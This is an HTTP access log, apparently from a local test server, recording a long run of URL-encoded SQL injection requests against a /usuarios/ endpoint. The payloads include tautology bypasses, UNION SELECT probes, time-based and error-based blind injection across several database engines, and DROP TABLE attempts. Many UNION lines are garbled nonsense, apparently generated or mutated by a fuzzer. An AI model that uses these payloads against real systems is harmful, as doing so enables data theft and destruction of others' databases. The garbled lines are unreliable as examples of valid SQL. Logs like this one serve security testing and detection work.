Servidor rodando em http://0.0.0.0:8000
172.18.0.1 - GET /usuarios/test1%20)%20as%20qodq%20where%204945%20=%204945%20or%209643%20=%20(%20select%20count%20(%20*%20)%20from%20domain.domains%20as%20t1,domain.columns%20as%20t2,domain.tables%20as%20t3%20)%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/testb%7Ccbvu@d%5D36i!-%5D@--+x&80!%3E&o)_x%3E4%7D_,%5C%7B,ik%5E2-%7B_*l(%5Bv+unj+8.a1?%60%20co+5(jx%5B%5B%20aix=wobz3%5D=jr%5B%5E8aqt.5%5Dk%3Ca0;%20a+mb2%7Dh7-%25:d%5D~y3%5B3e%5B%5C%3E$!%7C1?:%25 HTTP/1.1
172.18.0.1 - GET /usuarios/test1%25%22%20)%20)%20and%202716%20=%20(%20select%20count%20(%20*%20)%20from%20sysusers%20as%20sys1,sysusers%20as%20sys2,sysusers%20as%20sys3,sysusers%20as%20sys4,sysusers%20as%20sys5,sysusers%20as%20sys6,sysusers%20as%20sys7%20)%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/testselect%20*%20from%20users%20where%20id%20=%201%20+%20$+%25%5C%20or%201%20=%201%20--%201 HTTP/1.1
172.18.0.1 - GET /usuarios/test1'%20)%20)%20and%208514%20=%20(%20select%20count%20(%20*%20)%20from%20domain.domains%20as%20t1,domain.columns%20as%20t2,domain.tables%20as%20t3%20)%20and%20(%20(%20'dixa'%20like%20'dixa HTTP/1.1
172.18.0.1 - GET /usuarios/test1'%20)%20and%203824%20=%20benchmark%20(%205000000,md5%20(%200x76555642%20)%20)%20and%20(%20'qhsy'%20=%20'qhks HTTP/1.1
172.18.0.1 - GET /usuarios/test1%22%20)%20as%20ymto%20where%203453%20=%203453 HTTP/1.1
172.18.0.1 - GET /usuarios/test1%20)%20)%20as%20cjmd%20where%208931%20=%208931%20or%205356%20=%20(%20select%20count%20(%20*%20)%20from%20sysusers%20as%20sys1,sysusers%20as%20sys2,sysusers%20as%20sys3,sysusers%20as%20sys4,sysusers%20as%20sys5,sysusers%20as%20sys6,sysusers%20as%20sys7%20)%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test1'%7C%7C%20(%20select%20'kryt'%20where%203837%20=%203887 HTTP/1.1
172.18.0.1 - GET /usuarios/test1'%20and%20(%20select%20*%20from%20(%20select%20(%20sleep%20(%205%20)%20)%20)%20gcrr%20)%20 HTTP/1.1
172.18.0.1 - GET /usuarios/test1'%20)%20)%20)%20and%203824%20=%20benchmark%20(%205000000,md5%20(%200x76555642%20)%20)%20and%20(%20(%20(%20'zerf'%20=%20'zerf HTTP/1.1
172.18.0.1 - GET /usuarios/test1%22%20)%20)%20)%20or%209643%20=%20(%20select%20count%20(%20*%20)%20from%20domain.domains%20as%20t1,domain.columns%20as%20t2,domain.tables%20as%20t3%20)%20and%20(%20(%20(%20%22jzsb%22%20=%20%22jzsb HTTP/1.1
172.18.0.1 - GET /usuarios/testselect%20count%20(%20*%20)%20from%20generate_series%20(%201,5000000%20)%20and%20(%20(%20'jloi'%20=%20'jloi HTTP/1.1
172.18.0.1 - GET /usuarios/test-1644'%20)%20)%20)%20or%202724%20in%20(%20(%20char%20(%20113%20)%20+char%20(%20113%20)%20+char%20(%20112%20)%20+char%20(%20106%20)%20+char%20(%20113%20)%20+%20(%20select%20(%20case%20when%20(%202724%20=%202724%20)%20then%20char%20(%2049%20)%20else%20char%20(%2048%20)%20end%20)%20)%20+char%20(%20113%20)%20+char%20(%20122%20)%20+char%20(%20118%20)%20+char%20(%20122%20)%20+ HTTP/1.1
172.18.0.1 - GET /usuarios/testselect%20*%20from%20generate_series%20(%204975,4975,case%20when%20(%204975%20=%209615%20)%20then%201%20else%200%20end%20)%20limit%201%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test1'%20in%20boolean%20mode%20)%20union%20all%20select%20null,null,null,null,null,null,null%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test-7829'%20)%20)%20)%20or%203440%20=%20cast%20(%20(%20chr%20(%20113%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20112%20)%20%7C%7Cchr%20(%20106%20)%20%7C%7Cchr%20(%20113%20)%20)%20%7C%7C%20(%20select%20(%20case%20when%20(%203440%20=%203440%20)%20then%201%20else%200%20end%20)%20)%20::text%7C%7C%20(%20chr%20(%20113%20)%20%7C%7Cchr%20(%20122%20)%20%7C%7Cchr%20(%20118%20)%20%7C%7Cchr%20(%20122%20)%20%7C%7Cchr%20( HTTP/1.1
172.18.0.1 - GET /usuarios/testselect%20*%20from%20users%20where%20id%20=%201%20or%20%22%25.%22%20or%201%20=%201%20--%201 HTTP/1.1
172.18.0.1 - GET /usuarios/test1%25%22%20)%20)%20)%20and%20updatexml%20(%203393,concat%20(%200x2e,0x7171706a71,%20(%20select%20(%20elt%20(%203393%20=%203393,1%20)%20)%20)%20,0x717a767a71%20)%20,1161%20)%20and%20(%20(%20(%20%22%25%22%20=%20%22 HTTP/1.1
172.18.0.1 - GET /usuarios/test1'%20)%20)%20and%203715%20in%20(%20(%20char%20(%20113%20)%20+char%20(%20113%20)%20+char%20(%20112%20)%20+char%20(%20106%20)%20+char%20(%20113%20)%20+%20(%20select%20(%20case%20when%20(%203715%20=%203715%20)%20then%20char%20(%2049%20)%20else%20char%20(%2048%20)%20end%20)%20)%20+char%20(%20113%20) HTTP/1.1
172.18.0.1 - GET /usuarios/test1'%20)%20)%20)%20or%208315%20=%20(%20select%20count%20(%20*%20)%20from%20sysibm.systables%20as%20t1,sysibm.systables%20as%20t2,sysibm.systables%20as%20t3%20)%20and%20(%20(%20(%20'vjhw'%20like%20'vjhw HTTP/1.1
172.18.0.1 - GET /usuarios/test1'%20)%20)%20and%20elt%20(%204249%20=%204249,7259%20)%20and%20(%20(%20'xjns'%20=%20'xjns HTTP/1.1
172.18.0.1 - GET /usuarios/test1%20)%20)%20)%20and%20(%20select%20*%20from%20(%20select%20(%20sleep%20(%205%20)%20)%20)%20fzno%20)%20and%20(%20(%20(%201601%20=%201601 HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20OR%20'1'='1 HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20OR%20'1'='1%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20OR%20'1'='1 HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20verale_tembent%20tament3%20)%20from%20sysubr.sy%20wher HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@,versocemant)tebcanemanetablepate HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20table_schema,table_name%20FROM%20iname_1; HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(chars%20ly$;,%20pas%20where%20)%20trantuse%20(%20chr%20(%20113%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20112%20)%20%7C%7Cchr%20(%20106%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7C%20(%20select%20(%20case%20when%20(%207386%20=%207386%20)%20then%201%20else%200%20end%20)%20from%20dual%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20122%20)%20%7C%7Cchr%20(%20118%20)%20%7C HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20(%20table_samerial,name_Nibl_%20)%20,@@vERSion%20)%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(char.%20lybe_taber';%20)%20;int%20(%201/**/ HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20-%20Table_name,%20Dirlated%20'%20vasibbese%20(%20PASS%20WAWCC%20)%20TheN%20ALL HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20table_sccamedo_tabe%20From%20vy;fule%20) HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20(%20table_samerial,resemand_selep%20gy_nume%20)%20)%20and%20'ibc'%20like%20'ibch HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20table_name'%20)%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20,%20users,alectame'%20)%20,%20and%20'c'%20not%20=%20'cent HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@(%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20by11,1%20)%20)%20)%20;1' HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(chars%20ly$;,ly,p%20);;%20'/**/ HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20(%20,%20SELECT%20vErSion((%20)%20,%20s/**/ HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20;)%20,%20usernim%20table_table%20)%20FR HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20-%20Table_name%20(%20Chr%20(%20'sANJ'%20liKe%20'vaa'%20)%20,%20(%20seLEct%201)%20ANd%200%20--%200X1i HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20-%20Table_name,%20DROM%20intor%20gevarion_geramend%20)%20)%20AND%201%20=%201%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20lys:%20)%20;1',1,1%20)%20) HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20'ynom',%20)%20,1,1%20)%20)%20=%201%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20,%20users,alecture%20'exal'%20)%20,%20' HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20table_name'%20)%20,RUSE%20=%201,SLEEPP%20((%200b2%20)%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20)%20,%20usernemant HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(count%20(%20)%20,%20select%20@@version,%20)%20/**/ HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(count%20)%20and%20'vevite'like%20'vite%20vike%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test';%20DROP%20TABLE%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test';%20DROP%20TABLE%20S HTTP/1.1
172.18.0.1 - PUT /usuarios/test';%20DROP%20TABLE%20SEM HTTP/1.1
172.18.0.1 - PUT /usuarios/test';%20DROP%20TABLE%20(%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test';%20DROP%20TABLE%20SE HTTP/1.1
172.18.0.1 - PUT /usuarios/test';%20DROP%20TABLE%20Se HTTP/1.1
172.18.0.1 - PUT /usuarios/test';%20DROP%20TABLE%20SET%20%3C HTTP/1.1
172.18.0.1 - PUT /usuarios/test';%20DROP%20TABLE%20ST HTTP/1.1
172.18.0.1 - PUT /usuarios/test%22%20OR%20%221%22=%221%22%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test1%22%20)%20)%20as%20eqeb%20where%206784%20=%206784%20and%20updatexml%20(%203393,concat%20(%200x2e,0x7171706a71,%20(%20select%20(%20elt%20(%203393%20=%203393,1%20)%20)%20)%20,0x717a767a71%20)%20,1161%20)%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test1'%20and%203824%20=%20benchmark%20(%205000000,md5%20(%200x76555642%20)%20) HTTP/1.1
172.18.0.1 - PUT /usuarios/test1'%20)%20or%20(%20select%209173%20from%20(%20select%20count%20(%20*%20)%20,concat%20(%200x7171706a71,%20(%20select%20(%20elt%20(%209173%20=%209173,1%20)%20)%20)%20,0x717a767a71,floor%20(%20rand%20(%200%20)%20*2%20)%20)%20x%20from%20information_schema.character_sets%20group%20by%20x%20)%20a%20)%20and%20(%20'nlfl'%20like%20'nlfl HTTP/1.1
172.18.0.1 - PUT /usuarios/test1%22)%20where%202602=2602%20and%208407=(select%20count(*)%20from%20generate_series(1,5000000))%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test1'%20)%20or%20(%20select%20*%20from%20(%20select%20(%20sleep%20(%205%20)%20)%20)%20ydpu%20)%20and%20(%20'zaes'%20=%20'zaes HTTP/1.1
172.18.0.1 - PUT /usuarios/test1'%7C%7C%20(%20select%20'ymac'%20from%20dual%20where%209268%20=%209268%20or%208514%20=%20benchmark%20(%205000000,md5%20(%200x544d5a4c%20)%20)%20 HTTP/1.1
172.18.0.1 - PUT /usuarios/test1'%20)%20and%20sleep%20(%205%20)%20and%20(%20'njud'%20=%20'njud HTTP/1.1
172.18.0.1 - PUT /usuarios/test1%22%20)%20as%20eefe%20where%205290%20=%205290%20and%20(%20select%20*%20from%20(%20select%20(%20sleep%20(%205%20)%20)%20)%20gcrr%20)%20 HTTP/1.1
172.18.0.1 - PUT /usuarios/test1%22%20)%20where%206723%20=%206723%20and%20(%205316%20=%204231%20)%20*4238%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test1%25'%20)%20)%20or%208514%20=%20benchmark%20(%205000000,md5%20(%200x544d5a4c%20)%20)%20 HTTP/1.1
172.18.0.1 - PUT /usuarios/test1%22%20)%20)%20as%20tngu%20where%203644%20=%203644%20union%20all%20select%20null%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test1%22%20)%20as%20dien%20where%204022%20=%204022 HTTP/1.1
172.18.0.1 - PUT /usuarios/test1'%20)%20procedure%20analyse%20(%20extractvalue%20(%205840,concat%20(%200x5c,0x7171706a71,%20(%20select%20(%20case%20when%20(%205840%20=%205840%20)%20then%201%20else%200%20end%20)%20)%20,0x717a767a71%20)%20)%20,1%20)%20and%20(%20'rxxb'%20=%20'rxxb HTTP/1.1
172.18.0.1 - PUT /usuarios/test1%22%20)%20as%20zohs%20where%209213%20=%209213%20rlike%20(%20select%20(%20case%20when%20(%207689%20=%207689%20)%20then%201%20else%200x28%20end%20)%20)%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test1'%20)%20)%20)%20and%20elt%20(%201210%20=%201210,sleep%20(%205%20)%20)%20and%20(%20(%20(%20'aiuy'%20=%20'aiuy HTTP/1.1
172.18.0.1 - PUT /usuarios/test-3560'%20where%209768%20=%209768%20order%20by%201%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/testselect%20*%20from%20users%20where%20id%20=%201%20or%20%22??%22%20or%201%20=%201%20--%201 HTTP/1.1
172.18.0.1 - PUT /usuarios/test-2981%22%20or%206872%20=%206872%20and%20%22%25%22%20=%20%22 HTTP/1.1
172.18.0.1 - PUT /usuarios/testselect%20count%20(%20*%20)%20from%20generate_series%20(%201,5000000%20)%20and%20(%20(%20'hxcq'%20=%20'hxcq HTTP/1.1
172.18.0.1 - PUT /usuarios/test1'%20)%20)%20as%20vnwn%20where%208774%20=%208774%20and%20(%20select%20*%20from%20(%20select%20(%20sleep%20(%205%20)%20)%20)%20gcrr%20)%20 HTTP/1.1
172.18.0.1 - PUT /usuarios/test1%20)%20)%20and%206537%20=%20dbms_pipe.receive_message%20(%20chr%20(%2076%20)%20%7C%7Cchr%20(%20116%20)%20%7C%7Cchr%20(%20117%20)%20%7C%7Cchr%20(%2065%20)%20,5%20)%20and%20(%20(%206010%20=%206010 HTTP/1.1
172.18.0.1 - PUT /usuarios/test1%22%20)%20)%20as%20drss%20where%202077%20=%202077%20and%207533%20=%207533%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/testADMIn'/or%200x1X0X8o0b8o0O9X1/*Z:)%22ErG%20Z*/or~%22+%22=%22%20p%22%3COr%5D(SELeCT%200O0X0o1522)=0b9x4X7B0O0B0o2X87F825125dfc/**/%3C&&%20,%20(%5B~'XfjD'='XffZ HTTP/1.1
172.18.0.1 - PUT /usuarios/test1%20)%20)%20as%20xcyo%20where%202929%20=%202929 HTTP/1.1
172.18.0.1 - PUT /usuarios/test1'+%20(%20select%20'ljtl'%20where%201766%20=%201766 HTTP/1.1
172.18.0.1 - PUT /usuarios/test1'%20)%20as%20sruz%20where%206318%20=%206318 HTTP/1.1
172.18.0.1 - PUT /usuarios/test1%22));select%20(case%20when%20(4666=4666)%20then%201%20else%204666*(select%204666%20from%20master..sysdatabases)%20end)%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20OR%20'1'='1%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20OR%20'1'='1 HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20converse%20)%20not%20tebe_nem;%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(char.%20lybe_taber';%20)%20+ind'%20(%201%20)%20%3C%3E%201/**/ HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20table_schema,table_name%20FROM%20iname_1 HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20(%20,%20users,gverpabp_race);%20vorichly HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@(%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20verale_tember%20temanb%203%20F HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(char.)%20;%20as%20tibntimitl%20(%20'1,1,0%20and%20)%20from%20sysusurs%20as%20where%20systumonsyas%20t0,nomaunscale%20)%20,rum/**/ HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20'ynom',%20)%20,1,1%20)%20)%20=%201%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made,%20call_unet%20/**/ HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(count%20(%20)%20,%20select%20@@verseon,%20)%20)%20)%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20-%20Table_name%20(%20Chr%20(%20%22SANJEXP%20)%20)%20) HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(char.)%20,%20as%20tabctame%20and%20'i'%20=%20'1 HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,alecture'%20)%20and%20'i'%20=%20'i HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(chars%20ly$),%20gancer%20)%20then%20select%201%20alden/**/ HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(chars%20ly$;,%20sybcharaby/**/ HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(count%20()%20,%20)%20,evertime%20(%20'1,1,1/0%20)%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20(%20table_samerial,name_Nibl$%20)%20,vErSiON%20(%20,%20)%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20verseoncmateine%20(%20',%20(,%20@,0X7,0X1,0X67)%20AND%200x6%20)%20,(SELECT%201) HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20by11,1%20)%20)%20)%20;1' HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,mateberpease_tabesc)%20AND%20'F'%20=%20' HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20;)%20,%20usernman HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20verseoncmant%20ide%20LIKE%20'U HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made,call%20ing_vell_'%20)%20,1/**/ HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20(%20table_samerial,name_NibL_,%20S,%20,@SLEXP%20)%20@&&%20@,%20,%20LIKE%20(SELECT%20(SELECT%20(SELECT%20(SELECT%20(SELECT%201)))))%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test';%20DROP%20TABLE%20SEM%20;Uxer%20and%20usering'%20like%20'%25@ut'%20writt%201%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test';%20DROP%20TABLE%20SE HTTP/1.1
172.18.0.1 - DELETE /usuarios/test';%20DROP%20TABLE%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test';%20DROP%20TABLE%20(%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test';%20DROP%20TABLE%20SEM HTTP/1.1
172.18.0.1 - DELETE /usuarios/test';%20DROP%20TABLE%20S HTTP/1.1
172.18.0.1 - DELETE /usuarios/test';%20DROP%20TABLE%20Se HTTP/1.1
172.18.0.1 - DELETE /usuarios/test%22%20OR%20%221%22=%221%22%20-- HTTP/1.1
